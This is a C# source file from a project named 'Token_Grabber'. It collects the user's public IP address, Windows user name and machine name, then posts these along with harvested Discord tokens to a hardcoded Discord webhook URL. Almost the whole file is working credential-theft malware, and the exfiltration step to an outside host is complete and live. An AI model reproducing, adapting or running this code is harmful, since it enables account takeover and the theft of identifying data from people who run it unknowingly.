using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Token_Grabber
{
    public class PrintAllInfo
    {
        public static string weblink = ("https://api.ipify.org/");
        public PrintAllInfo()
        {
            SendInfo();
        }

        /// <summary>
        /// Sends info to discord webhook
        /// </summary>
        static void SendInfo()
        {
            //Discord webhook url
            string url = "https://discord.com/api/webhooks/959071811419652096/dOkV-5nK6JXpqa-86ODdZfbkAaV9UhJ9fzlLf3Ta-35SmGYjkY_XZCxGsYdAfbERDZUT";
            string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \" \\n \\n \\n \\n\\n\", \"title\":\"Info:\", \"color\":1018364}] }";

            string newjson = json.Insert(65, $"{GetIp()}");
            newjson = newjson.Insert(68 + GetIp().Length, $"{Environment.UserName}");
            newjson = newjson.Insert(71 + Environment.UserName.Length + GetIp().Length, $"{Environment.MachineName}");


            //Filters through possible tokens
            foreach(string item in DiscordToken.matchs)
            {
                try
                {
                    string virtualjson = newjson.Insert(77 + GetIp().Length + Environment.UserName.Length + Environment.MachineName.Length, $"{item}");
                    SendDiscordWebhook(url, virtualjson);
                }
                catch { }
            }
        }

        /// <summary>
        /// Method to send data to webhook
        /// </summary>
        /// <param name="URL"></param>
        /// <param name="escapedjson"></param>
        public static void SendDiscordWebhook(string URL, string escapedjson)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(escapedjson);
            wr.GetResponse();
        }
        /// <summary>
        /// Method returns ip
        /// </summary>
        /// <returns></returns>
        public static string GetIp()
        {
            string ip = new WebClient().DownloadString(weblink);
            return ip;
        }


    }
}
